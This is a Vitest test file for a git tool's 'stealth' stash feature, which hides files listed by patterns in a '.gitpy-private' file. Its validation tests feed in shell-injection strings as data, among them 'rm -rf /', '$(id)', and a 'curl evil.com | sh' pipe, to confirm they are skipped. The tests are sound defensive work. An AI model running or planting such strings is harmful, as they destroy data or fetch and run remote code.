import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import * as execUtil from '../../../../src/utils/executor';
import * as stealth from '../../../../src/services/tools/stealth';

vi.mock('../../../../src/utils/executor');

let tempDir: string;

beforeEach(() => {
  vi.clearAllMocks();
  tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'stealth-test-'));
});

afterEach(() => {
  fs.rmSync(tempDir, { recursive: true, force: true });
});

describe('stealth — pattern validation', () => {
  it('skips patterns with command substitution `$(...)`', async () => {
    fs.writeFileSync(path.join(tempDir, '.gitpy-private'), '"; rm -rf /\n$(id)\n`whoami`\n');

    const result = await stealth.stealthStash(tempDir);
    expect(result.success).toBe(true);
    expect(result.hiddenFiles).toEqual([]);
    expect(execUtil.safeExecGit).not.toHaveBeenCalled();
  });

  it('skips patterns with backticks', async () => {
    fs.writeFileSync(path.join(tempDir, '.gitpy-private'), '"; curl evil.com | sh\n');

    const result = await stealth.stealthStash(tempDir);
    expect(result.hiddenFiles).toEqual([]);
  });

  it('skips patterns exceeding length limit', async () => {
    const long = 'a'.repeat(600);
    fs.writeFileSync(path.join(tempDir, '.gitpy-private'), `${long}\n`);

    const result = await stealth.stealthStash(tempDir);
    expect(result.hiddenFiles).toEqual([]);
  });

  it('processes valid `*.secret` pattern via argv (no shell)', async () => {
    fs.writeFileSync(path.join(tempDir, '.gitpy-private'), '*.secret\n');
    vi.mocked(execUtil.safeExecGit).mockResolvedValue({ stdout: 'foo.secret\nbar.secret', stderr: '' });

    await stealth.stealthStash(tempDir);

    const call = vi.mocked(execUtil.safeExecGit).mock.calls.find(c =>
      c[0][0] === 'ls-files' && c[0][1] === '--others'
    );
    expect(call).toBeDefined();
    expect(call![0]).toEqual(['ls-files', '--others', '--exclude-standard', '*.secret']);
  });

  it('passes directory patterns via argv', async () => {
    fs.writeFileSync(path.join(tempDir, '.gitpy-private'), 'credentials/\n');
    vi.mocked(execUtil.safeExecGit).mockResolvedValue({ stdout: 'credentials/token.txt', stderr: '' });

    await stealth.stealthStash(tempDir);

    const call = vi.mocked(execUtil.safeExecGit).mock.calls.find(c =>
      c[0][0] === 'ls-files' && c[0][1] === '--others'
    );
    expect(call![0]).toEqual(['ls-files', '--others', '--exclude-standard', 'credentials/']);
  });

  it('moves files actually present on disk', async () => {
    fs.mkdirSync(path.join(tempDir, 'credentials'), { recursive: true });
    fs.writeFileSync(path.join(tempDir, 'credentials', 'token.txt'), 'secret');
    fs.writeFileSync(path.join(tempDir, '.gitpy-private'), 'credentials/\n');
    vi.mocked(execUtil.safeExecGit).mockResolvedValue({ stdout: 'credentials/token.txt', stderr: '' });

    const result = await stealth.stealthStash(tempDir);
    expect(result.success).toBe(true);
    expect(result.hiddenFiles).toContain('credentials/token.txt');
    expect(fs.existsSync(path.join(tempDir, '.gitpy-temp', 'credentials', 'token.txt'))).toBe(true);
  });

  it('handles missing .gitpy-private gracefully', async () => {
    const result = await stealth.stealthStash(tempDir);
    expect(result.success).toBe(true);
    expect(result.hiddenFiles).toEqual([]);
  });
});
